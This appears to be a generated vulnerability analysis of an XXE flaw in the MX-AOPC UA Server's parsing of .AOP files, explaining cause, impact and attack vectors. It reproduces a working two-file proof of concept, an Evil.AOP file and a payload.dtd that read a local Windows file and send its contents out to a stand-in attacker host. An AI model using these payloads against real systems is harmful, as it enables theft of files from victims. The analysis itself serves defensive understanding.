Based on the provided content, here's a breakdown of the vulnerability described:

**Root Cause:**
The vulnerability stems from the MX-AOPC UA Server's handling of XML files, specifically .AOP files. The server processes these files without proper sanitization, allowing for XML External Entity (XXE) injection.

**Weaknesses/Vulnerabilities:**
- **XXE Injection:** The core vulnerability is the lack of proper input validation when parsing XML files. The server processes external entities defined within the XML, leading to the XXE vulnerability.

**Impact of Exploitation:**
- **Remote File Disclosure:** An attacker can exploit the XXE vulnerability to disclose the content of arbitrary files on the server. This is demonstrated by the proof of concept, which retrieves the content of `c:\Windows\msdfmap.ini`.

**Attack Vectors:**
- **Malicious .AOP File:** The attacker crafts a malicious .AOP file containing an XXE payload.
- **User Interaction:** A local user must open the crafted .AOP file using the vulnerable MX-AOPC server.
- **Attacker-Controlled Server:** The attacker needs a server to host the malicious `payload.dtd` file.

**Required Attacker Capabilities/Position:**
-   The attacker needs to be able to create a malicious .AOP file
-   The attacker needs to host a malicious payload.dtd file accessible to the victim
-   The attacker needs to trick a local user into opening a malicious .AOP file using the MX-AOPC UA Server

**Technical Details:**
The exploit involves two files:
1.  **Evil.AOP:**
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE roottag [
    <!ENTITY % file SYSTEM "c:\Windows\msdfmap.ini">
    <!ENTITY % dtd SYSTEM "http://ATTACKER-IP:8080/payload.dtd">
    %dtd;]>
    <pwn>&send;</pwn>
    ```
    This file defines an entity `%file` to read a local file and an entity `%dtd` to fetch an external DTD from the attacker's server.
2.  **payload.dtd:**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER-IP:8080?%file;'>">
    %all;
    ```
    This DTD defines an entity `send` that will send the content of the previously read file (`%file`) as part of the URL to the attacker's server.

When the victim opens `Evil.AOP`, the XML parser fetches `payload.dtd` from the attacker's server. The `payload.dtd` instructs the parser to send the content of `c:\Windows\msdfmap.ini` back to the attacker's server as part of the HTTP GET request.

The server logs the request with the file content in the URL like this:
`VICTIM-IP - - [02/Mar/2017 10:06:00] "GET /?;[content of c:\Windows\msdfmap.ini] HTTP/1.1" 200 -`

This is a classic XXE exploit scenario, leveraging the server's lack of proper input validation for file disclosure.
